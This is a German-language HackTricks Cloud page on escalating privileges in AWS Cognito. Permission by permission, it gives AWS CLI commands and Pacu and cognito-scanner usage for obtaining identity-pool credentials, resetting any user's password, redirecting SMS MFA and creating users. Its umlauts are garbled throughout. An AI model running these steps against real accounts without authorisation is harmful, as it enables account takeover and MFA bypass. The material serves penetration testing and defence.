# AWS - Cognito Privilege Escalation

<details>

<summary><strong>Erlernen Sie AWS-Hacking von Grund auf mit</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Andere M√∂glichkeiten, HackTricks zu unterst√ºtzen:

* Wenn Sie Ihr **Unternehmen in HackTricks beworben sehen m√∂chten** oder **HackTricks im PDF-Format herunterladen m√∂chten**, √ºberpr√ºfen Sie die [**ABONNEMENTPL√ÑNE**](https://github.com/sponsors/carlospolop)!
* Holen Sie sich das [**offizielle PEASS & HackTricks-Merch**](https://peass.creator-spring.com)
* Entdecken Sie [**The PEASS Family**](https://opensea.io/collection/the-peass-family), unsere Sammlung exklusiver [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Treten Sie der** üí¨ [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** üê¶ [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Teilen Sie Ihre Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) Github-Repositories einreichen.

</details>

## Cognito

F√ºr weitere Informationen zu Cognito siehe:

{% content-ref url="../aws-services/aws-cognito-enum/" %}
[aws-cognito-enum](../aws-services/aws-cognito-enum/)
{% endcontent-ref %}

### Sammeln von Anmeldeinformationen aus dem Identit√§tspool

Da Cognito **IAM-Rollenanmeldeinformationen** sowohl an **authentifizierte** als auch an **nicht authentifizierte Benutzer** vergeben kann, k√∂nnen Sie, wenn Sie die **Identit√§tspool-ID** einer Anwendung finden (die wahrscheinlich fest codiert ist), neue Anmeldeinformationen erhalten und somit eine Privilegieneskalation durchf√ºhren (innerhalb eines AWS-Kontos, f√ºr das Sie wahrscheinlich zuvor keine Anmeldeinformationen hatten).

F√ºr weitere Informationen [**√ºberpr√ºfen Sie diese Seite**](../aws-unauthenticated-enum-access/#cognito).

**Potenzielle Auswirkungen:** Direkte Privilegieneskalation zur Dienstrolle, die an nicht authentifizierte Benutzer angeh√§ngt ist (und wahrscheinlich auch an diejenige, die an authentifizierte Benutzer angeh√§ngt ist).

### `cognito-identity:SetIdentityPoolRoles`, `iam:PassRole`

Mit dieser Berechtigung k√∂nnen Sie jedem authentifizierten/nicht authentifizierten Benutzer der Cognito-App **eine beliebige Cognito-Rolle zuweisen**.
```bash
aws cognito-identity set-identity-pool-roles \
--identity-pool-id <identity_pool_id> \
--roles unauthenticated=<role ARN>

# Get credentials
## Get one ID
aws cognito-identity get-id --identity-pool-id "eu-west-2:38b294756-2578-8246-9074-5367fc9f5367"
## Get creds for that id
aws cognito-identity get-credentials-for-identity --identity-id "eu-west-2:195f9c73-4789-4bb4-4376-99819b6928374" ole
```
Wenn die Cognito-App **keine unauthentifizierten Benutzer aktiviert hat**, ben√∂tigen Sie m√∂glicherweise auch die Berechtigung `cognito-identity:UpdateIdentityPool`, um sie zu aktivieren.

**Potenzielle Auswirkungen:** Direkter Privilege Escalation zu jeder Cognito-Rolle.

### `cognito-identity:update-identity-pool`

Ein Angreifer mit dieser Berechtigung k√∂nnte beispielsweise ein Cognito-Benutzerpool unter seiner Kontrolle einrichten oder einen anderen Identit√§tsanbieter, bei dem er sich als **M√∂glichkeit zum Zugriff auf diesen Cognito Identity Pool** anmelden kann. Dann wird das **Anmelden** bei diesem Benutzeranbieter ihm erm√∂glichen, auf die konfigurierte authentifizierte Rolle im Identit√§tspool zuzugreifen.
```bash
# This example is using a Cognito User Pool as identity provider
## but you could use any other identity provider
aws cognito-identity update-identity-pool \
--identity-pool-id <value> \
--identity-pool-name <value> \
[--allow-unauthenticated-identities | --no-allow-unauthenticated-identities] \
--cognito-identity-providers ProviderName=user-pool-id,ClientId=client-id,ServerSideTokenCheck=false

# Now you need to login to the User Pool you have configured
## after having the id token of the login continue with the following commands:

# In this step you should have already an ID Token
aws cognito-identity get-id \
--identity-pool-id <id_pool_id> \
--logins cognito-idp.<region>.amazonaws.com/<YOUR_USER_POOL_ID>=<ID_TOKEN>

# Get the identity_id from thr previous commnad response
aws cognito-identity get-credentials-for-identity \
--identity-id <identity_id> \
--logins cognito-idp.<region>.amazonaws.com/<YOUR_USER_POOL_ID>=<ID_TOKEN>
```
Es ist auch m√∂glich, **diese Berechtigung zu missbrauchen, um die Basic-Authentifizierung zu erm√∂glichen**:
```bash
aws cognito-identity update-identity-pool \
--identity-pool-id <value> \
--identity-pool-name <value> \
--allow-unauthenticated-identities
--allow-classic-flow
```
**Potenzielle Auswirkungen**: Kompromittierung der konfigurierten authentifizierten IAM-Rolle innerhalb des Identit√§tspools.

### `cognito-idp:AdminAddUserToGroup`

Diese Berechtigung erm√∂glicht es, **einen Cognito-Benutzer zu einer Cognito-Gruppe hinzuzuf√ºgen**, daher k√∂nnte ein Angreifer diese Berechtigung missbrauchen, um einen Benutzer unter seiner Kontrolle zu anderen Gruppen mit **h√∂heren** Privilegien oder **unterschiedlichen IAM-Rollen** hinzuzuf√ºgen:
```bash
aws cognito-idp admin-add-user-to-group \
--user-pool-id <value> \
--username <value> \
--group-name <value>
```
**Potenzielle Auswirkungen:** Privilege Escalation zu anderen Cognito-Gruppen und IAM-Rollen, die den Benutzerpoolgruppen zugeordnet sind.

### (`cognito-idp:CreateGroup` | `cognito-idp:UpdateGroup`), `iam:PassRole`

Ein Angreifer mit diesen Berechtigungen k√∂nnte **Gruppen erstellen/aktualisieren**, die **jede IAM-Rolle enthalten, die von einem kompromittierten Cognito Identity Provider verwendet werden kann**, und einen kompromittierten Benutzer Teil der Gruppe machen, um auf all diese Rollen zuzugreifen:

{% code overflow="wrap" %}
```bash
aws cognito-idp create-group --group-name Hacked --user-pool-id <user-pool-id> --role-arn <role-arn>
```
{% endcode %}

**Potenzielle Auswirkungen:** Privilege Escalation zu anderen Cognito IAM-Rollen.

### `cognito-idp:AdminConfirmSignUp`

Diese Berechtigung erm√∂glicht es, **eine Anmeldung zu best√§tigen**. Standardm√§√üig kann sich jeder in Cognito-Anwendungen anmelden. Wenn dies so belassen wird, k√∂nnte ein Benutzer ein Konto mit beliebigen Daten erstellen und es mit dieser Berechtigung best√§tigen.
```bash
aws cognito-idp admin-confirm-sign-up \
--user-pool-id <value> \
--username <value>
```
**Potenzielle Auswirkungen:** Indirekte Privilege Escalation auf die IAM-Rolle des Identit√§tspools f√ºr authentifizierte Benutzer, wenn es m√∂glich ist, einen neuen Benutzer zu registrieren. Indirekte Privilege Escalation auf andere App-Funktionalit√§ten, indem ein beliebiges Konto best√§tigt werden kann.

### `cognito-idp:AdminCreateUser`

Diese Berechtigung w√ºrde einem Angreifer erm√∂glichen, einen neuen Benutzer im Benutzerpool zu erstellen. Der neue Benutzer wird als aktiviert erstellt, muss jedoch sein Passwort √§ndern.
```bash
aws cognito-idp admin-create-user \
--user-pool-id <value> \
--username <value> \
[--user-attributes <value>] ([Name=email,Value=email@gmail.com])
[--validation-data <value>]
[--temporary-password <value>]
```
**Potenzielle Auswirkungen:** Direktes Privilege Escalation auf die IAM-Rolle des Identit√§tspools f√ºr authentifizierte Benutzer. Indirektes Privilege Escalation auf andere App-Funktionalit√§ten, indem beliebige Benutzer erstellt werden k√∂nnen.

### `cognito-idp:AdminEnableUser`

Diese Berechtigungen k√∂nnen in einem sehr speziellen Fall helfen, in dem ein Angreifer die Anmeldeinformationen eines deaktivierten Benutzers gefunden hat und ihn **wieder aktivieren muss**.
```bash
aws cognito-idp admin-enable-user \
--user-pool-id <value> \
--username <value>
```
**Potenzielle Auswirkungen:** Indirekte Privilege Escalation zur IAM-Rolle des Identit√§tspools f√ºr authentifizierte Benutzer und Berechtigungen des Benutzers, wenn der Angreifer Anmeldeinformationen f√ºr einen deaktivierten Benutzer hatte.

### `cognito-idp:AdminInitiateAuth`, **`cognito-idp:AdminRespondToAuthChallenge`**

Diese Berechtigung erm√∂glicht das Einloggen mit der Methode **ADMIN_USER_PASSWORD_AUTH**. Weitere Informationen finden Sie unter folgendem Link.

### `cognito-idp:AdminSetUserPassword`

Diese Berechtigung w√ºrde einem Angreifer erlauben, das Passwort eines beliebigen Benutzers zu √§ndern, was es ihm erm√∂glicht, sich als beliebiger Benutzer auszugeben (sofern dieser keine MFA aktiviert hat).
```bash
aws cognito-idp admin-set-user-password \
--user-pool-id <value> \
--username <value> \
--password <value> \
--permanent
```
**Potenzielle Auswirkungen:** Direktes Privilegien-Eskalation zu potenziell jedem Benutzer, daher Zugriff auf alle Gruppen, denen jeder Benutzer angeh√∂rt, und Zugriff auf die IAM-Rolle des authentifizierten Identit√§tspools.

### `cognito-idp:AdminSetUserSettings` | `cognito-idp:SetUserMFAPreference` | `cognito-idp:SetUserPoolMfaConfig` | `cognito-idp:UpdateUserPool`

**AdminSetUserSettings**: Ein Angreifer k√∂nnte potenziell diese Berechtigung missbrauchen, um ein Mobiltelefon unter seiner Kontrolle als **SMS-MFA eines Benutzers** festzulegen.
```bash
aws cognito-idp admin-set-user-settings \
--user-pool-id <value> \
--username <value> \
--mfa-options <value>
```
**SetUserMFAPreference:** √Ñhnlich wie zuvor kann diese Berechtigung verwendet werden, um die MFA-Pr√§ferenzen eines Benutzers zu setzen und somit den MFA-Schutz zu umgehen.
```bash
aws cognito-idp admin-set-user-mfa-preference \
[--sms-mfa-settings <value>] \
[--software-token-mfa-settings <value>] \
--username <value> \
--user-pool-id <value>
```
**SetUserPoolMfaConfig**: √Ñhnlich wie die vorherige Berechtigung kann diese Berechtigung verwendet werden, um die MFA-Einstellungen eines Benutzer-Pools zu setzen und den MFA-Schutz zu umgehen.
```bash
aws cognito-idp set-user-pool-mfa-config \
--user-pool-id <value> \
[--sms-mfa-configuration <value>] \
[--software-token-mfa-configuration <value>] \
[--mfa-configuration <value>]
```
**UpdateUserPool:** Es ist auch m√∂glich, den Benutzerpool zu aktualisieren, um die MFA-Richtlinie zu √§ndern. [√úberpr√ºfen Sie hier die CLI](https://docs.aws.amazon.com/cli/latest/reference/cognito-idp/update-user-pool.html).

**Potenzielle Auswirkungen:** Indirekte Privilegieneskalation zu potenziell jedem Benutzer, von dem der Angreifer die Anmeldeinformationen kennt. Dies k√∂nnte es erm√∂glichen, den MFA-Schutz zu umgehen.

### `cognito-idp:AdminUpdateUserAttributes`

Ein Angreifer mit dieser Berechtigung k√∂nnte die E-Mail-Adresse oder Telefonnummer oder ein anderes Attribut eines Benutzers unter seiner Kontrolle √§ndern, um zu versuchen, mehr Privilegien in einer zugrunde liegenden Anwendung zu erlangen.\
Dies erm√∂glicht das √Ñndern einer E-Mail-Adresse oder Telefonnummer und das Festlegen als verifiziert.
```bash
aws cognito-idp admin-update-user-attributes \
--user-pool-id <value> \
--username <value> \
--user-attributes <value>
```
**Potenzielle Auswirkungen:** Potenzielle indirekte Privilege Escalation in der zugrunde liegenden Anwendung unter Verwendung von Cognito User Pool, die Berechtigungen basierend auf Benutzerattributen vergibt.

### `cognito-idp:CreateUserPoolClient` | `cognito-idp:UpdateUserPoolClient`

Ein Angreifer mit dieser Berechtigung k√∂nnte **einen neuen User Pool Client mit weniger Einschr√§nkungen erstellen**, als bereits vorhandene Pool-Clients. Zum Beispiel k√∂nnte der neue Client jede Art von Authentifizierungsmethode zulassen, keinen geheimen Schl√ºssel haben, die Tokenwiderrufung deaktiviert haben, zulassen, dass Tokens f√ºr einen l√§ngeren Zeitraum g√ºltig sind...

Das Gleiche kann erreicht werden, wenn anstelle der Erstellung eines neuen Clients ein **vorhandener ge√§ndert wird**.

In der [**Befehlszeile**](https://docs.aws.amazon.com/cli/latest/reference/cognito-idp/create-user-pool-client.html) (oder der [**Aktualisierung**](https://docs.aws.amazon.com/cli/latest/reference/cognito-idp/update-user-pool-client.html)) k√∂nnen Sie alle Optionen sehen, √ºberpr√ºfen Sie es!.
```bash
aws cognito-idp create-user-pool-client \
--user-pool-id <value> \
--client-name <value> \
[...]
```
**Potenzielle Auswirkungen:** Potenzielle indirekte Privilegieneskalation zum vom Benutzerpool verwendeten Identit√§tspool autorisierten Benutzer, indem ein neuer Client erstellt wird, der die Sicherheitsma√ünahmen lockert und es einem Angreifer erm√∂glicht, sich mit einem Benutzer anzumelden, den er erstellen konnte.

### `cognito-idp:CreateUserImportJob` | `cognito-idp:StartUserImportJob`

Ein Angreifer k√∂nnte diese Berechtigung missbrauchen, um Benutzer zu erstellen, indem er eine CSV-Datei mit neuen Benutzern hochl√§dt.
```bash
# Create a new import job
aws cognito-idp create-user-import-job \
--job-name <value> \
--user-pool-id <value> \
--cloud-watch-logs-role-arn <value>

# Use a new import job
aws cognito-idp start-user-import-job \
--user-pool-id <value> \
--job-id <value>

# Both options before will give you a URL where you can send the CVS file with the users to create
curl -v -T "PATH_TO_CSV_FILE" \
-H "x-amz-server-side-encryption:aws:kms" "PRE_SIGNED_URL"
```
(In dem Fall, dass Sie einen neuen Import-Job erstellen, ben√∂tigen Sie m√∂glicherweise auch die IAM-Passrolle-Berechtigung, die ich noch nicht getestet habe).

**Potenzielle Auswirkungen:** Direktes Privilegien-Eskalation auf die IAM-Rolle des Identit√§tspools f√ºr authentifizierte Benutzer. Indirekte Privilegien-Eskalation auf andere App-Funktionalit√§ten, indem beliebige Benutzer erstellt werden k√∂nnen.

### `cognito-idp:CreateIdentityProvider` | `cognito-idp:UpdateIdentityProvider`

Ein Angreifer k√∂nnte einen neuen Identit√§tsanbieter erstellen, um sich dann **√ºber diesen Anbieter anzumelden**.
```bash
aws cognito-idp create-identity-provider \
--user-pool-id <value> \
--provider-name <value> \
--provider-type <value> \
--provider-details <value> \
[--attribute-mapping <value>] \
[--idp-identifiers <value>]
```
**Potenzielle Auswirkungen:** Direktes Privilegien-Eskalation zum IAM-Rolle des Identit√§tspools f√ºr authentifizierte Benutzer. Indirekte Privilegien-Eskalation zu anderen App-Funktionalit√§ten durch die M√∂glichkeit, jeden Benutzer zu erstellen.

### Analyse von cognito-sync:\*

Dies ist eine sehr h√§ufige Berechtigung standardm√§√üig in Rollen von Cognito Identit√§tspools. Auch wenn ein Platzhalter in Berechtigungen immer schlecht aussieht (besonders wenn es von AWS kommt), sind die **erteilten Berechtigungen aus der Perspektive eines Angreifers nicht besonders n√ºtzlich**.

Diese Berechtigung erlaubt das Lesen von Benutzerinformationen der Identit√§tspools und Identit√§ts-IDs innerhalb der Identit√§tspools (was keine sensiblen Informationen sind).\
Identit√§ts-IDs k√∂nnen [**Datens√§tze**](https://docs.aws.amazon.com/cognitosync/latest/APIReference/API\_Dataset.html) zugewiesen haben, die Informationen zu den Sitzungen enthalten (AWS definiert es als ein **gespeichertes Spiel**). Es ist m√∂glich, dass hier sensible Informationen enthalten sind (aber die Wahrscheinlichkeit ist ziemlich gering). Auf der [**Enumeration-Seite**](../aws-services/aws-cognito-enum/) finden Sie, wie auf diese Informationen zugegriffen werden kann.

Ein Angreifer k√∂nnte auch diese Berechtigungen nutzen, um sich **f√ºr einen Cognito-Stream anzumelden, der √Ñnderungen ver√∂ffentlicht** oder eine **Lambda-Funktion, die auf Cognito-Ereignisse reagiert** auszul√∂sen. Ich habe gesehen, dass dies nicht verwendet wird, und ich w√ºrde hier keine sensiblen Informationen erwarten, aber es ist nicht unm√∂glich.

### Automatische Tools

* [Pacu](https://github.com/RhinoSecurityLabs/pacu), das AWS-Exploit-Framework, enth√§lt jetzt die Module "cognito\_\_enum" und "cognito\_\_attack", die die Enumeration aller Cognito-Assets in einem Konto automatisieren und schwache Konfigurationen, Benutzerattribute f√ºr den Zugriffskontrolle usw. kennzeichnen, sowie die automatisierte Benutzererstellung (einschlie√ülich MFA-Unterst√ºtzung) und Privilegien-Eskalation basierend auf √§nderbaren benutzerdefinierten Attributen, verwendbaren Identit√§tspool-Anmeldeinformationen, √ºbernehmbaren Rollen in ID-Token usw.

F√ºr eine Beschreibung der Funktionsweise der Module siehe Teil 2 des [Blog-Beitrags](https://rhinosecuritylabs.com/aws/attacking-aws-cognito-with-pacu-p2). F√ºr Installationsanweisungen siehe die Hauptseite von [Pacu](https://github.com/RhinoSecurityLabs/pacu).

#### Verwendung

Beispielhafte Verwendung von cognito\_\_attack, um die Benutzererstellung zu versuchen und alle Privilegien-Eskalationsvektoren gegen einen bestimmten Identit√§tspool und Benutzerpool-Client durchzuf√ºhren:
```bash
Pacu (new:test) > run cognito__attack --username randomuser --email XX+sdfs2@gmail.com --identity_pools
us-east-2:a06XXXXX-c9XX-4aXX-9a33-9ceXXXXXXXXX --user_pool_clients
59f6tuhfXXXXXXXXXXXXXXXXXX@us-east-2_0aXXXXXXX
```
Beispiel f√ºr die Verwendung von cognito\_\_enum, um alle Benutzerpools, Benutzerpool-Clients, Identit√§tspools, Benutzer usw. zu sammeln, die im aktuellen AWS-Konto sichtbar sind:
```bash
Pacu (new:test) > run cognito__enum
```
* [Cognito Scanner](https://github.com/padok-team/cognito-scanner) ist ein CLI-Tool in Python, das verschiedene Angriffe auf Cognito implementiert, einschlie√ülich einer Privilege Escalation.

#### Installation
```bash
$ pip install cognito-scanner
```
#### Verwendung
```bash
$ cognito-scanner --help
```
F√ºr weitere Informationen besuchen Sie [https://github.com/padok-team/cognito-scanner](https://github.com/padok-team/cognito-scanner)

<details>

<summary><strong>Erlernen Sie AWS-Hacking von Null auf mit</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Andere M√∂glichkeiten, HackTricks zu unterst√ºtzen:

* Wenn Sie Ihr **Unternehmen in HackTricks beworben sehen m√∂chten** oder **HackTricks im PDF-Format herunterladen m√∂chten**, √ºberpr√ºfen Sie die [**ABONNEMENTPL√ÑNE**](https://github.com/sponsors/carlospolop)!
* Holen Sie sich das [**offizielle PEASS & HackTricks-Merch**](https://peass.creator-spring.com)
* Entdecken Sie [**The PEASS Family**](https://opensea.io/collection/the-peass-family), unsere Sammlung exklusiver [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Treten Sie der** üí¨ [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** üê¶ [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Teilen Sie Ihre Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repositories einreichen.

</details>
